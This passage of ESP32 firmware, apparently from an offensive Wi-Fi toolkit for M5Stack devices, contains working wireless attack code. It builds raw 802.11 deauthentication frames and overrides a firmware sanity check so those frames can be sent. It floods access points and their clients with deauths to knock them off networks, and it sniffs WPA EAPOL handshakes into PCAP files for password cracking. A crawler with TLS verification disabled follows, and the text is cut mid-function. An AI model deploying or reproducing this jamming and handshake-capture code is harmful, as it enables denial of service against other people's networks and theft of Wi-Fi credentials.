  while (WiFi.status() != WL_CONNECTED && timeout > 0) {
    delay(1000);
    timeout--;
    Serial.print(".");
  }
  Serial.println();

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("WiFi connected successfully!");
    M5.Display.clear();
    M5.Display.setCursor(0, 10);
    M5.Display.println("Connected!");
    M5.Display.setCursor(0, 30);
    M5.Display.println("IP: " + WiFi.localIP().toString());
    M5.Display.display();
    delay(2000); // Affiche le message pendant 2 secondes
    return true;
  } else {
    Serial.println("Failed to connect to WiFi.");
    M5.Display.clear();
    M5.Display.setCursor(0, 10);
    M5.Display.println("Failed to connect.");
    M5.Display.setCursor(0, 30);
    M5.Display.println("Please try again.");
    M5.Display.display();
    delay(2000); // Affiche le message pendant 2 secondes
    return false;
  }
}

// Fonction principale de connexion Wi-Fi
void connectWifi(int networkIndex) {
  Serial.println("Starting WiFi connection process...");

  if (WiFi.localIP().toString() != "0.0.0.0") {
    if (confirmPopup("You want to disconnect ?")) {
      Serial.println("Disconnecting from current WiFi...");
      WiFi.disconnect(true);
      waitAndReturnToMenu("Disconnected");
      return;
    } else {
      waitAndReturnToMenu("Stay connected...");
      return;
    }
  }

  String nameSSID = ssidList[networkIndex];
  String typedPassword = "";

  Serial.print("Selected network SSID: ");
  Serial.println(nameSSID);

  // Si le réseau est ouvert, passer directement à la connexion
  if (getWifiSecurity(networkIndex) == "Open") {
    Serial.println("Network is open, no password required.");
    if (connectToWiFi(nameSSID, "")) {
      waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
      ssid = nameSSID; // Stocke le SSID sélectionné
    } else {
      waitAndReturnToMenu("Failed to connect to WiFi: " + nameSSID);
    }
    return;
  }
  
  // Vérifier si le SSID est déjà enregistré
  if (ssid == nameSSID) {
    Serial.println("Previously connected to this network. Trying saved password...");
    if (connectToWiFi(nameSSID, password)) {
      waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
      return;
    } else {
      Serial.println("Failed to connect with saved password, asking for a new one...");
    }
  }

  // Demander le mot de passe pour les réseaux sécurisés
  M5.Display.clear();
  M5.Display.setCursor(0, 10);
  M5.Display.println("Enter Password for " + nameSSID);
  M5.Display.setCursor(0, 30);
  M5.Display.display();
}


// deauther start
// Big thanks to Aro2142 (https://github.com/7h30th3r0n3/Evil-M5Core2/issues/16)
// Even Bigger thanks to spacehuhn https://github.com/spacehuhn / https://spacehuhn.com/
// Big thanks to the Nemo project for the easy bypass: https://github.com/n0xa/m5stick-nemo
// Reference to understand : https://github.com/risinek/esp32-wifi-penetration-tool/tree/master/components/wsl_bypasser

// Warning
// You need to bypass the esp32 firmware with scripts in utilities before compiling or deauth is not working due to restrictions on ESP32 firmware
// Warning

// Global MAC addresses
uint8_t source_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t receiver_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast
uint8_t ap_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

// Global deauth frame initialized with default values
uint8_t deauth_frame[26] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Receiver MAC
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source MAC
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
  0xf0, 0xff, 0x02, 0x00
};

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  if (arg == 31337)
    return 1;
  else
    return 0;
}

// Function to update MAC addresses in the global deauth frame
void updateMacAddresses(const uint8_t* bssid) {
  memcpy(source_mac, bssid, 6);
  memcpy(ap_mac, bssid, 6);

  // Update the global deauth frame with the source and BSSID
  memcpy(&deauth_frame[10], source_mac, 6);  // Source MAC
  memcpy(&deauth_frame[16], ap_mac, 6);      // BSSID
}

int deauthCount = 0;

void snifferCallbackDeauth(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
  const uint8_t *frame = pkt->payload;
  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);

  const uint8_t frameType = (frameControl & 0x0C) >> 2;
  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

  if (estUnPaquetEAPOL(pkt)) {
    Serial.println("EAPOL Detected !!!!");

    const uint8_t *receiverAddr = frame + 4;
    const uint8_t *senderAddr = frame + 10;

    Serial.print("Address MAC destination: ");
    printAddress(receiverAddr);
    Serial.print("Address MAC expedition: ");
    printAddress(senderAddr);

    enregistrerDansFichierPCAP(pkt, false);
    nombreDeEAPOL++;
    M5.Lcd.setCursor(260, 0);
    M5.Lcd.printf("H:");
    M5.Lcd.print(nombreDeHandshakes);
    if (nombreDeEAPOL < 999) {
      M5.Lcd.setCursor(212, 18);
    } else {
      M5.Lcd.setCursor(202, 18);
    }
    M5.Lcd.printf("EAPOL:");
    M5.Lcd.print(nombreDeEAPOL);
  }

  if (frameType == 0x00 && frameSubType == 0x08) {
    const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon

    // Convertir l'adresse MAC en chaîne de caractères pour la comparaison
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);


    pkt->rx_ctrl.sig_len -= 4;  // Réduire la longueur du signal de 4 bytes
    enregistrerDansFichierPCAP(pkt, true);  // Enregistrer le paquet
  }

}


void deauthAttack(int networkIndex) {
  deauthCount = 0;
  String ssid = WiFi.SSID(networkIndex);
  if (!confirmPopup("Deauth attack on:\n      " + ssid)) {
    inMenu = true;
    drawMenu();
    return;
  }
  Serial.println("Deauth attack started");

  ESP_BT.end();
  bluetoothEnabled = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); // Petite pause pour s'assurer que tout est terminé
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_mode(WIFI_MODE_STA); // Set station mode
  esp_wifi_start(); // start Wi-Fi


  if (confirmPopup("   Do you want to\n       sniff EAPOL ?")) {
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(snifferCallbackDeauth);
  }

  if (networkIndex < 0 || networkIndex >= numSsid) {
    Serial.println("Network index out of bounds");
    return;
  }
  M5.Display.clear();

  // Récupérer les informations de l'AP sélectionné
  uint8_t* bssid = WiFi.BSSID(networkIndex);
  int channel = WiFi.channel(networkIndex);
  String macAddress = bssidToString(bssid);

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  currentChannelDeauth = channel;
  updateMacAddresses(bssid);

  Serial.print("SSID: "); Serial.println(ssid);
  Serial.print("MAC Address: "); Serial.println(macAddress);
  Serial.print("Channel: "); Serial.println(channel);

  if (!bssid || channel <= 0) {
    Serial.println("Invalid AP - aborting attack");
    M5.Display.println("Invalid AP");
    return;
  }

  int delayTime = 500; // initial delay between deauth packets
  unsigned long previousMillis = 0;
  const int debounceDelay = 200;
  unsigned long lastDebounceTime = 0;

  // Setup display
  M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
  M5.Display.setCursor(135, M5.Display.height() - 40);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.println("Stop");

  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Display.setCursor(10, 40);
  M5.Display.println("SSID: " + ssid);
  M5.Display.setCursor(10, 60);
  M5.Display.println("MAC: " + macAddress);
  M5.Display.setCursor(10, 80);
  M5.Display.println("Channel : " + String(channel));

  M5.Display.setCursor(10, 110);
  M5.Display.print("Deauth sent: ");
  Serial.println("-------------------");
  Serial.println("Starting Deauth Attack");
  Serial.println("-------------------");

  while (true) {
    unsigned long currentMillis = millis();

    if (currentMillis - previousMillis >= delayTime) {
      previousMillis = currentMillis;

      sendDeauthPacket();
      deauthCount++;

      M5.Display.setCursor(M5.Display.height() / 2 + 35, 110);
      M5.Display.print(String(deauthCount));

      M5.Display.setCursor(100, M5.Display.height() / 2 + 20);
      M5.Display.print("Delay: " + String(delayTime) + "ms    ");

      Serial.println("-------------------");
      Serial.println("Deauth packet sent : " + String(deauthCount));
      Serial.println("-------------------");
    }

    M5.update();
    // Adjust delay with buttons
    if (M5.BtnA.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
      lastDebounceTime = currentMillis;
      delayTime = max(300, delayTime - 100); // Decrease delay
    }
    if (M5.BtnC.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
      lastDebounceTime = currentMillis;
      delayTime = min(3000, delayTime + 100); // Increase delay
    }
    if (M5.BtnB.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
      break; // Stop the attack
    }
  }
  Serial.println("-------------------");
  Serial.println("Stopping Deauth Attack");
  Serial.println("-------------------");

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  /*esp_wifi_stop();
    esp_wifi_deinit();*/

  waitAndReturnToMenu("Stopping Deauth Attack");
}

void sendDeauthPacket() {
  // Send the pre-defined global deauth frame
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
  Serial.println();
}

//deauther end



// Sniff and deauth clients
bool macFromString(const std::string& macStr, uint8_t* macArray) {
  int values[6];  // Temporary array to store the parsed values
  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
             &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) == 6) {
    // Convert to uint8_t
    for (int i = 0; i < 6; ++i) {
      macArray[i] = static_cast<uint8_t>(values[i]);
    }
    return true;
  }
  return false;
}


void broadcastDeauthAttack(const uint8_t* ap_mac, int channel) {
  // Set the channel to the AP's channel
  esp_err_t ret = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
    return;
  }
  M5.Lcd.setCursor(89, 1);
  M5.Lcd.printf("C:");
  M5.Lcd.print(channel);
  M5.Lcd.print(" ");

  // Set AP and source MAC addresses
  updateMacAddresses(ap_mac);

  // Set the receiver MAC to broadcast
  memset(receiver_mac, 0xFF, 6);  // Broadcast MAC address

  Serial.println("-----------------------------");
  Serial.print("Deauth for AP MAC: ");
  Serial.println(mac_to_string(ap_mac).c_str());
  Serial.print("On Channel: ");
  Serial.println(channel);


  // Send 10 deauthentication packets
  for (int i = 0; i < nbDeauthSend; i++) {
    sendDeauthPacket();
  }
}

void sendDeauthToClient(const uint8_t* client_mac, const uint8_t* ap_mac, int channel) {
  esp_err_t ret = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
    return;
  }
  M5.Lcd.setCursor(89, 1);
  M5.Lcd.printf("C:");
  M5.Lcd.print(channel);
  M5.Lcd.print(" ");

  uint8_t deauth_frame[sizeof(deauth_frame)];
  memcpy(deauth_frame, deauth_frame, sizeof(deauth_frame));

  // Modifier les adresses MAC dans la trame de déauthentification
  memcpy(deauth_frame + 4, ap_mac, 6);  // Adresse MAC de l'AP (destinataire)
  memcpy(deauth_frame + 10, client_mac, 6);  // Source MAC client
  memcpy(deauth_frame + 16, ap_mac, 6);      // BSSID (AP)

  // Envoyer la trame modifiée
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);

  /*// Debugging output of packet contents
    Serial.println("Deauthentication Frame Sent:");
    for (int i = 0; i < sizeof(deauth_frame); i++) {
    Serial.print(deauth_frame[i], HEX);
    Serial.print(" ");
    }
    Serial.println();*/
}

void sendBroadcastDeauths() {
  for (auto& ap : connections) {
    if (!ap.second.empty() && isRegularAP(ap.first)) {
      if (ap_names.find(ap.first) != ap_names.end() && !ap_names[ap.first].empty()) {
        esp_task_wdt_reset();  // S'assurer que le watchdog est réinitialisé fréquemment
        vTaskDelay(pdMS_TO_TICKS(10));  // Pause pour éviter de surcharger le CPU
        Serial.println("-----------------------------");
        Serial.print("Sending Broadcast Deauth to AP: ");
        Serial.println(ap_names[ap.first].c_str());

        M5.Lcd.setCursor(M5.Display.height() / 2 - 60 , M5.Display.width() / 2 + 20);
        M5.Lcd.printf(ap_names[ap.first].c_str());

        int channel = ap_channels_map[ap.first];
        uint8_t ap_mac_address[6];
        if (macFromString(ap.first, ap_mac_address)) {
          broadcastDeauthAttack(ap_mac_address, channel);
          // Après l'attaque de broadcast, envoyer une trame à chaque client
          for (const auto& client : ap.second) {
            uint8_t client_mac[6];
            if (macFromString(client, client_mac)) {
              Serial.println("-----------------------------");
              Serial.print("Sending Deauth from client MAC ");
              Serial.print(mac_to_string(client_mac).c_str());
              Serial.print(" to AP MAC ");
              Serial.println(mac_to_string(ap_mac_address).c_str());

              M5.Lcd.setCursor(M5.Display.height() / 2 - 60, M5.Display.width() / 2);
              M5.Lcd.printf("Sending Deauth to");

              for (int i = 0; i < nbDeauthSend; i++) {
                sendDeauthToClient(client_mac, ap_mac_address, channel);
              }
            }
          }
          vTaskDelay(deauthWaitingTime);
          M5.Lcd.setCursor(M5.Display.height() / 2 - 60 , M5.Display.width() / 2 + 20);
          M5.Lcd.printf("                                ");
        } else {
          Serial.println("Failed to convert AP MAC address from string.");
        }
        M5.Lcd.setCursor(M5.Display.height() / 2 - 60, M5.Display.width() / 2);
        M5.Lcd.printf("                 ");
      }
    }
  }
}

std::string mac_to_string(const uint8_t* mac) {
  char buf[18];
  sprintf(buf, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return std::string(buf);
}

void changeChannel() {
  static auto it = ap_channels.begin(); // Initialisation de l'iterator

  // Vérification de l'existence de canaux
  if (ap_channels.empty()) {
    Serial.println("Aucun canal valide n'est disponible.");
    return;
  }

  if (it == ap_channels.end()) {
    it = ap_channels.begin();  // Réinitialiser l'iterator si nécessaire
  }

  int newChannel = *it;  // Récupérer le canal courant

  // Vérification de la validité du canal
  if (newChannel < 1 || newChannel > 13) {
    Serial.println("Canal invalide détecté. Réinitialisation au premier canal valide.");
    Serial.println(newChannel);
    Serial.println(*it);
    it = ap_channels.begin();  // Réinitialiser l'iterator
    newChannel = *it;  // Récupérer un canal valide
  }

  // Tentative de changement du canal Wi-Fi
  esp_err_t ret = esp_wifi_set_channel(newChannel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    Serial.printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
    return;
  }

  // Mise à jour du canal actuel et avancement de l'iterator
  currentChannel = newChannel;
  it++;

  // Affichage de la confirmation du changement
  Serial.print("Switching channel on  ");
  Serial.println(currentChannel);
  Serial.println("-----------------------------");

  // Mise à jour de l'affichage sur l'appareil M5
  M5.Lcd.setCursor(89, 1);
  M5.Lcd.printf("C:%d ", currentChannel);
}


void wifi_scan() {
  Serial.println("-----------------------------");
  Serial.println("Scanning WiFi networks...");
  ap_channels.clear();
  M5.Lcd.setCursor(M5.Display.height() / 2 - 168, M5.Display.width() / 2);
  M5.Lcd.printf("Scanning nearby networks..");

  int n = WiFi.scanNetworks(false, false);
  if (n == 0) {
    Serial.println("No networks found");
    M5.Lcd.setCursor(0, 1);
    M5.Lcd.printf("No AP found                    ");
    return;
  }

  Serial.print("Found ");
  Serial.print(n);
  Serial.println(" networks");

  for (int i = 0; i < n; ++i) {
    String ssid = WiFi.SSID(i);
    int32_t rssi = WiFi.RSSI(i);
    uint8_t *bssid = WiFi.BSSID(i);
    int32_t channel = WiFi.channel(i);

    std::string bssidString = mac_to_string(bssid);
    ap_names[bssidString] = ssid.c_str();
    ap_channels.insert(channel);
    ap_channels_map[bssidString] = channel;

    // Convert std::string to const char* for Serial.print
    Serial.print(bssidString.c_str());
    Serial.print(" | ");
    Serial.print(ssid);
    Serial.print(" | Channel: ");
    Serial.println(channel);
  }

  Serial.println("-----------------------------");
  M5.Lcd.setCursor(0, 1);
  M5.Lcd.printf("AP:");
  M5.Lcd.print(n);
  M5.Lcd.print("  ");
  M5.Lcd.drawLine(0, 17, M5.Lcd.width(), 17, TFT_WHITE);
  M5.Lcd.setCursor(M5.Display.height() / 2 - 168, M5.Display.width() / 2);
  M5.Lcd.printf("                          ");
}



bool isRegularAP(const std::string& mac) {
  std::regex multicastRegex("^(01:00:5e|33:33|ff:ff:ff|01:80:c2)");
  return !std::regex_search(mac, multicastRegex);
}
void print_connections() {
  int yPos = 25;  // Initial Y position for text on the screen

  for (auto& ap : connections) {
    if (isRegularAP(ap.first)) {
      if (ap_names.find(ap.first) != ap_names.end() && !ap_names[ap.first].empty()) {
        // Clear the line before printing new data
        M5.Lcd.fillRect(0, yPos, M5.Lcd.width(), 20, BLACK);

        // Print to Serial
        Serial.print(ap_names[ap.first].c_str());
        Serial.print(" (");
        Serial.print(ap.first.c_str());
        Serial.print(") on channel ");
        Serial.print(ap_channels_map[ap.first]);
        Serial.print(" has ");
        Serial.print(ap.second.size());
        Serial.println(" clients:");
        for (auto& client : ap.second) {
          Serial.print(" - ");
          Serial.println(client.c_str());
        }
        // Print to screen
        String currentAPName = String(ap_names[ap.first].c_str());
        int clientCount = ap.second.size();
        String displayText = currentAPName + ": " + String(clientCount);

        M5.Lcd.setCursor(0, yPos);
        M5.Lcd.println(displayText);

        yPos += 20;  // Move the Y position for the next line

        // Ensure there is enough screen space for the next line
        if (yPos > M5.Lcd.height() - 20) {
          break;  // Exit the loop if there's not enough space for more lines
        }
      }
    }
  }
  Serial.println("-----------------------------");
}


void promiscuous_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
  const uint8_t *frame = pkt->payload;
  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
  const uint8_t frameType = (frameControl & 0x0C) >> 2;
  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

  const uint8_t *bssid = frame + 16; // BSSID position for management frames
  std::string bssidStr = mac_to_string(bssid);

  if (estUnPaquetEAPOL(pkt)) {
    Serial.println("-----------------------------");
    Serial.println("EAPOL Detected !!!!!!!!!!!!!!!");
    // Extract the BSSID from the packet, typically found at Address 3 in most WiFi frames
    const uint8_t *bssid = frame + 16;

    // Convert the BSSID to string format
    std::string bssidStr = mac_to_string(bssid);

    // Look up the AP name using the BSSID
    std::string apName = ap_names[bssidStr];

    // Print the AP name to the serial output
    Serial.print("EAPOL Detected from AP: ");
    if (!apName.empty()) {
      Serial.println(apName.c_str());
      M5.Lcd.setCursor(0 , M5.Display.width() / 2 + 54);
      String eapolapname = apName.c_str();
      M5.Lcd.print("EAPOL!:" + eapolapname + "                ");
    } else {
      Serial.println("Unknown AP");
      M5.Lcd.setCursor(0 , M5.Display.width() / 2 + 54);
      M5.Lcd.printf("EAPOL from Unknow                               ");
    }
    Serial.println("-----------------------------");


    enregistrerDansFichierPCAP(pkt, false);
    nombreDeEAPOL++;
    M5.Lcd.setCursor(153, 1);
    M5.Lcd.printf("H:");
    M5.Lcd.print(nombreDeHandshakes);
    if (nombreDeEAPOL < 99) {
      M5.Lcd.setCursor(217, 1);
    } else {
      M5.Lcd.setCursor(205, 1);
    }
    M5.Lcd.printf("E:");
    M5.Lcd.print(nombreDeEAPOL);
    esp_task_wdt_reset();  // Réinitialisation du watchdog
    // Délay pour permettre au task IDLE de s'exécuter
    vTaskDelay(pdMS_TO_TICKS(10));
  }

  if (frameType == 0x00 && frameSubType == 0x08) {
    const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon

    // Convertir l'adresse MAC en chaîne de caractères pour la comparaison
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);


    pkt->rx_ctrl.sig_len -= 4;  // Réduire la longueur du signal de 4 bytes
    enregistrerDansFichierPCAP(pkt, true);  // Enregistrer le paquet
  }

  if (frameType != 2) return;

  const uint8_t *mac_ap = frame + 4;
  const uint8_t *mac_client = frame + 10;
  std::string ap_mac = mac_to_string(mac_ap);
  std::string client_mac = mac_to_string(mac_client);

  if (!isRegularAP(ap_mac) || ap_mac == client_mac) return;

  if (connections.find(ap_mac) == connections.end()) {
    connections[ap_mac] = std::vector<std::string>();
  }
  if (std::find(connections[ap_mac].begin(), connections[ap_mac].end(), client_mac) == connections[ap_mac].end()) {
    connections[ap_mac].push_back(client_mac);
  }
}


void purgeAllAPData() {
  connections.clear();  // Clears all client associations
  M5.Lcd.fillRect(0, 25, M5.Lcd.width(), M5.Lcd.height() - 55, BLACK);
  Serial.println("All AP and client data have been purged.");
}




void deauthClients() {
  M5.Display.clear();

  ESP_BT.end();
  bluetoothEnabled = false;
  esp_wifi_set_promiscuous(false);
  WiFi.disconnect(true);  // Déconnecte et efface les paramètres WiFi enregistrés
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_restore();
  delay(300); // Petite pause pour s'assurer que tout est terminé

  nvs_flash_init();
  wifi_init_config_t cfg4 = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg4);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA);;
  esp_wifi_start();

  esp_err_t ret = esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
    return;
  }

  purgeAllAPData();
  wifi_scan();

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);

  M5.Lcd.setCursor(281, 1);
  M5.Lcd.printf("D:");
  if (isDeauthActive) {
    M5.Lcd.print("1");
  } else {
    M5.Lcd.print("0");
  }
  while (true) {
    esp_task_wdt_reset();  // Réinitialisation du watchdog
    // Délay pour permettre au task IDLE de s'exécuter
    vTaskDelay(pdMS_TO_TICKS(10));
    M5.update();
    if (M5.BtnA.wasPressed()) {
      if (!isDeauthActive) {
        isDeauthActive = true;
        Serial.println("Deauther activated !");
        M5.Lcd.setCursor(281, 1);
        M5.Lcd.printf("D:");
        M5.Lcd.print("1");
      } else {
        isDeauthActive = false;
        Serial.println("Deauther disabled !");
        M5.Lcd.setCursor(281, 1);
        M5.Lcd.printf("D:");
        M5.Lcd.print("0");
      }
    }
    if (M5.BtnB.wasPressed()) {
      esp_wifi_set_promiscuous(false);
      esp_wifi_set_promiscuous_rx_cb(NULL);
      break;
    }
    if (M5.BtnC.wasPressed()) {
      if (!isDeauthFast) {
        isDeauthFast = true;
        scanInterval = 30000; // interval of deauth and scanning network fast
        channelChangeInterval = 5000; // interval of channel switching fast
        clientPurgeInterval = 90000; //interval of clearing the client to exclude no more connected client or ap that not near anymore fast
        deauthWaitingTime = 5000;
        nbDeauthSend = 5;
        Serial.println("Fast mode enabled !");
        M5.Lcd.setCursor(269, 1);
        M5.Lcd.printf("F");
      } else {
        isDeauthFast = false;
        scanInterval = 90000; // interval of deauth and scanning network
        channelChangeInterval = 15000; // interval of channel switching
        clientPurgeInterval = 300000; //interval of clearing the client to exclude no more connected client or ap that not near anymore
        deauthWaitingTime = 7500;
        nbDeauthSend = 10;
        Serial.println("Fast mode disabled !");
        M5.Lcd.setCursor(269, 1);
        M5.Lcd.printf(" ");
      }
    }
    unsigned long currentTimeAuto = millis();

    // Lancement d'un scan et deauthbroadcast toutes les 60 secondes
    if (currentTimeAuto - lastScanTime >= scanInterval) {
      if (isDeauthActive) {
        sendBroadcastDeauths();  // Déconnexion broadcast
      }
      esp_wifi_set_promiscuous_rx_cb(NULL);
      wifi_scan();  // Lancement du scan
      esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);
      lastScanTime = currentTimeAuto;
      lastChannelChange = currentTimeAuto;  // Réinitialisation du timer pour éviter les conflits avec le changement de canal
    }

    // Purge des clients toutes les 5 minutes, assuré de ne pas coincider avec le scan
    if (currentTimeAuto - lastClientPurge >= clientPurgeInterval && currentTimeAuto - lastScanTime >= 1000) {
      purgeAllAPData();  // Purge des données
      lastClientPurge = currentTimeAuto;
    }

    // Gestion de l'affichage des connexions toutes les 2 secondes
    if (currentTimeAuto - lastPrintTime >= 2000) { // 2 seconde
      print_connections();
      lastPrintTime = currentTimeAuto;
    }


    // Changement de channel toutes les 15 secondes, seulement si un scan n'est pas en cours
    if (currentTimeAuto - lastChannelChange >= channelChangeInterval && currentTimeAuto - lastScanTime >= 1000) {
      changeChannel();
      lastChannelChange = currentTimeAuto;
    }

  }
  waitAndReturnToMenu("Stopping Sniffing...");
}


// Sniff and deauth clients end


//Check handshake
std::vector<String> pcapFiles;
int currentListIndexPcap = 0;

void checkHandshakes() {
  loadPcapFiles();
  displayPcapList();

  while (true) {
    M5.update();

    if (M5.BtnC.wasPressed()) {
      navigatePcapList(true); // naviguer vers le bas
    }
    if (M5.BtnA.wasPressed()) {
      navigatePcapList(false); // naviguer vers le haut
    }
    if (M5.BtnB.wasPressed()) {
      waitAndReturnToMenu("return to menu");
      return;
    }
  }
}

void loadPcapFiles() {
  File root = SD.open("/handshakes");
  pcapFiles.clear();
  while (File file = root.openNextFile()) {
    if (!file.isDirectory()) {
      String filename = file.name();
      if (filename.endsWith(".pcap")) {
        pcapFiles.push_back(filename);
      }
    }
  }
  if (pcapFiles.size() > 0) {
    currentListIndexPcap = 0; // Réinitialisez l'indice si de nouveaux fichiers sont chargés
  }
}

void displayPcapList() {
  const int listDisplayLimit = M5.Display.height() / 18;
  int listStartIndex = max(0, min(currentListIndexPcap, int(pcapFiles.size()) - listDisplayLimit));

  M5.Display.clear();
  M5.Display.setTextSize(2);
  for (int i = listStartIndex; i < min(int(pcapFiles.size()), listStartIndex + listDisplayLimit); i++) {
    if (i == currentListIndexPcap) {
      M5.Display.fillRect(0, (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
      M5.Display.setTextColor(TFT_GREEN);
    } else {
      M5.Display.setTextColor(TFT_WHITE);
    }
    M5.Display.setCursor(10, (i - listStartIndex) * 18);
    M5.Display.println(pcapFiles[i]);
  }
  M5.Display.display();
}

void navigatePcapList(bool next) {
  if (next) {
    currentListIndexPcap++;
    if (currentListIndexPcap >= pcapFiles.size()) {
      currentListIndexPcap = 0;
    }
  } else {
    currentListIndexPcap--;
    if (currentListIndexPcap < 0) {
      currentListIndexPcap = pcapFiles.size() - 1;
    }
  }
  displayPcapList();
}
//Check handshake end


#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

void enterDebounce() {
  while (M5.BtnB.wasPressed()) {
    M5.update();
    delay(10); // Petit délai pour réduire la charge du processeur
  }
}



// Web crawling
std::vector<String> urlList;  // Dynamic list for URLs
int startIndex = 0;           // Start index for display
const int maxDisplayLines = 11; // Maximum number of lines to display at a time
String urlBase = "";

void displayUrls() {
  M5.Display.clear();
  M5.Display.setCursor(0, 0);

  int displayCount = std::min(maxDisplayLines, (int)urlList.size());
  for (int i = 0; i < displayCount; ++i) {
    int displayIndex = (startIndex + i) % urlList.size();
    M5.Display.setCursor(0, 10 + i * 10);
    M5.Display.println(urlList[displayIndex]);
  }

  // Display position indicator
  M5.Display.setCursor(0, 0);
  M5.Display.printf(" %d-%d of %d on %s\n", startIndex + 1, startIndex + displayCount, urlList.size(), urlBase.c_str());
}

void addUrl(const String &url) {
  urlList.push_back(url);
  if (urlList.size() > maxDisplayLines) {
    startIndex = urlList.size() - maxDisplayLines;
  }
  displayUrls();
}

void scrollUp() {
  if (startIndex > 0) {
    startIndex--;
    displayUrls();
  }
}

void scrollDown() {
  if (startIndex + maxDisplayLines < urlList.size()) {
    startIndex++;
    displayUrls();
  }
}

void webCrawling(const IPAddress &ip) {
  webCrawling(ip.toString());
}

bool handleHttpResponse(HTTPClient &http, String &url) {
  int httpCode = http.GET();
  if (httpCode == 301 || httpCode == 302) {
    String newLocation = http.getLocation();
    if (confirmPopup("Redirection detected. Follow?\n" + newLocation)) {
      M5.Display.setTextSize(1);
      url = newLocation.startsWith("/") ? url.substring(0, url.indexOf('/', 8)) + newLocation : newLocation;
      return true;
    }
  }
  return (httpCode == 200);
}

void setupHttpClient(HTTPClient &http, WiFiClient &client, WiFiClientSecure &secureClient, String &url) {
  if (url.startsWith("https://")) {
    secureClient.setInsecure();
    http.begin(secureClient, url);
  } else {
    http.begin(client, url);
  }
  http.setTimeout(200); // Set timeout to 500 milliseconds
}

void webCrawling(const String &urlOrIp) {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return;
  }
  enterDebounce();
  startIndex = 0;
  urlList.clear();  // Clear the URL list at the start of crawling
  M5.Display.setTextColor(WHITE, BLACK);
  M5.Display.setTextSize(1);

  // Mettre à jour la variable globale `urlBase`
  if (urlOrIp.isEmpty()) {
    M5.Display.clear();
    M5.Display.setCursor(0, 10);
    M5.Display.println("Enter IP or Domain:");
    urlBase = "https://crawler-test.com/";//getUserInput();
    M5.Display.setTextSize(1);
  } else {
    urlBase = urlOrIp;
  }

  // Vérifier si l'entrée utilisateur est une adresse IP valide
  IPAddress ip;
  if (ip.fromString(urlBase)) {
    urlBase = "http://" + urlBase;
